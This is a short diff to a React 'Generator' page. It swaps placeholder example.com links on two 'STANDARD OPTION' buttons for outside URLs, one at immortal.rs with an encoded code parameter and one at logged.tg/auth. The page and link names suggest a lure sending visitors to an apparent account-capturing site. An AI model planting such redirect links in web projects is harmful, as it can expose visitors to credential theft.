@@ -66,7 +66,7 @@ const Generator = () => {
                 <Button
                   size="lg"
                   className="w-full text-xl font-bold py-7 bg-primary text-primary-foreground hover:bg-primary/90 glow-white-strong transition-all duration-300 hover:scale-[1.02]"
-                  onClick={() => window.open('https://example.com/main-site', '_blank')}
+                  onClick={() => window.open('https://immortal.rs/?code=NzA3Mzc1MjExMDU4MzA1NzIwOQ==', '_blank')}
                 >
                   STANDARD OPTION
                 </Button>
@@ -111,7 +111,7 @@ const Generator = () => {
                 <Button
                   size="lg"
                   className="w-full text-xl font-bold py-7 bg-primary text-primary-foreground hover:bg-primary/90 glow-white-strong transition-all duration-300 hover:scale-[1.02]"
-                  onClick={() => window.open('https://example.com/backup-site', '_blank')}
+                  onClick={() => window.open('https://www.logged.tg/auth/ethereal', '_blank')}
                 >
                   STANDARD OPTION
                 </Button>
